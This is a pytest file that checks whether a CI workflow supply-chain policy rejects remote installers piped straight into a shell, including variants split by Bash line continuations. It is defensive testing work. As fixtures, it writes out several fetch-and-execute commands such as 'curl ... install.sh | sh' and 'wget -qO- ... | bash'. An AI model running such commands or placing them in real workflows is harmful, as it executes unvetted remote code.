from __future__ import annotations

import runpy
from collections.abc import Callable
from pathlib import Path
from typing import cast

import pytest

_POLICY_PATH = Path("tests/test_workflow_supply_chain_policy.py")


def _owner_remote_pipe_policy(tmp_path: Path) -> Callable[[], None]:
    namespace = runpy.run_path(str(_POLICY_PATH))
    namespace["_WORKFLOW_ROOT"] = tmp_path
    return cast(
        Callable[[], None],
        namespace["test_workflows_do_not_pipe_remote_installers_to_shells"],
    )


def _assert_policy_rejects(policy: Callable[[], None], path: Path, text: str) -> None:
    path.write_text(text, encoding="utf-8")
    with pytest.raises(AssertionError, match="remote installer piped directly to a shell"):
        policy()
    path.unlink()


def test_owner_policy_rejects_backslash_continued_remote_installer_pipes(
    tmp_path: Path,
) -> None:
    """A Bash line continuation must not bypass the remote-installer pipe policy."""
    policy = _owner_remote_pipe_policy(tmp_path)
    workflow = tmp_path / "probe.yml"

    _assert_policy_rejects(
        policy,
        workflow,
        "run: curl -fsSL https://example.invalid/install.sh | sh\n",
    )
    _assert_policy_rejects(
        policy,
        workflow,
        "run: |\n"
        "  curl -fsSL https://example.invalid/install.sh \\\n"
        "    | sh\n",
    )
    _assert_policy_rejects(
        policy,
        workflow,
        "run: |\n"
        "  wget -qO- https://example.invalid/install.sh \\\n"
        "    | bash\n",
    )

    workflow.write_text(
        "run: |\n"
        "  curl -fsSL https://example.invalid/install.sh > installer.sh\n"
        "  echo downloaded-without-pipe\n",
        encoding="utf-8",
    )
    policy()
